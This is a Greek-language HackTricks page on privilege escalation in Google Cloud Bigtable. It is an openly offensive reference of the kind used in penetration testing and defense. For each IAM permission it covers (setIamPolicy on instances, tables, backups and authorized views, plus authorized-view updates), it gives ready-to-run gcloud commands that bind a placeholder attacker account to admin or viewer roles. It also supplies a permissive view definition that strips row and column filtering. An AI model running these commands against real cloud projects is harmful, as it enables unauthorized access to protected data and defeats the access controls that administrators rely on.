# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Για περισσότερες πληροφορίες σχετικά με το Bigtable, δείτε:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Δικαιώματα:** `bigtable.instances.setIamPolicy` (και συνήθως `bigtable.instances.getIamPolicy` για να διαβάσετε τις τρέχουσες δεσμεύσεις).

Η κατοχή της πολιτικής IAM του instance σας επιτρέπει να χορηγήσετε στον εαυτό σας **`roles/bigtable.admin`** (ή οποιονδήποτε προσαρμοσμένο ρόλο), ο οποίος επεκτείνεται σε κάθε cluster, πίνακα, αντίγραφο ασφαλείας και εξουσιοδοτημένη προβολή στην instance.
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
> [!TIP]
> Εάν δεν μπορείτε να απαριθμήσετε τα υπάρχοντα bindings, δημιουργήστε ένα νέο policy document και ανεβάστε το με `gcloud bigtable instances set-iam-policy` αρκεί να διατηρήσετε τα δικαιώματά σας επάνω σε αυτό.

Αφού αποκτήσετε αυτήν την άδεια ελέγξτε την [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) για τεχνικές και περισσότερους τρόπους εκμετάλλευσης των δικαιωμάτων του Bigtable.

### `bigtable.tables.setIamPolicy`

**Δικαιώματα:** `bigtable.tables.setIamPolicy` (προαιρετικά `bigtable.tables.getIamPolicy`).

Οι πολιτικές του instance μπορούν να κλειδωθούν ενώ οι μεμονωμένοι πίνακες εκχωρούνται ξεχωριστά. Αν μπορείτε να επεξεργαστείτε το IAM του πίνακα, μπορείτε να **αναβαθμίσετε τον εαυτό σας σε ιδιοκτήτη του στοχευόμενου dataset** χωρίς να επηρεάσετε άλλα workloads.
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
Αφού αποκτήσετε αυτήν την άδεια, ελέγξτε την [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) για περισσότερους τρόπους κατάχρησης των δικαιωμάτων Bigtable.


### `bigtable.backups.setIamPolicy`

**Δικαιώματα:** `bigtable.backups.setIamPolicy`

Τα backups μπορούν να αποκατασταθούν σε **οποιαδήποτε instance σε οποιοδήποτε project** που ελέγχετε. Πρώτα, δώστε στην ταυτότητά σας πρόσβαση στο backup, και στη συνέχεια αποκαταστήστε το σε ένα sandbox όπου κατέχετε ρόλους Admin/Owner.

Αν έχετε το δικαίωμα `bigtable.backups.setIamPolicy`, μπορείτε να χορηγήσετε στον εαυτό σας το δικαίωμα `bigtable.backups.restore` για να αποκαταστήσετε παλιά backups και να προσπαθήσετε να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
Αφού αποκτήσετε αυτήν την άδεια, ανατρέξτε στην [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) για να δείτε πώς να επαναφέρετε ένα backup.


### Ενημέρωση authorized view

**Δικαιώματα:** `bigtable.authorizedViews.update`

Τα Authorized Views προορίζονται να αποκρύπτουν γραμμές/στήλες. Η τροποποίησή τους ή η διαγραφή τους **αφαιρεί τους λεπτομερείς περιορισμούς ασφαλείας** στους οποίους βασίζονται οι αμυνόμενοι.
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
Αφού έχετε αυτό το δικαίωμα, δείτε την [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) για να μάθετε πώς να διαβάζετε από ένα authorized view.

### `bigtable.authorizedViews.setIamPolicy`

**Δικαιώματα:**  `bigtable.authorizedViews.setIamPolicy`.

Ένας επιτιθέμενος με αυτό το δικαίωμα μπορεί να χορηγήσει στον εαυτό του πρόσβαση σε ένα Authorized View, το οποίο μπορεί να περιέχει ευαίσθητα δεδομένα στα οποία διαφορετικά δεν θα είχε πρόσβαση.
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
Αφού γίνει αυτός ο έλεγχος δικαιωμάτων στην [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) για να δείτε πώς να διαβάσετε από μια εξουσιοδοτημένη προβολή.



{{#include ../../../banners/hacktricks-training.md}}
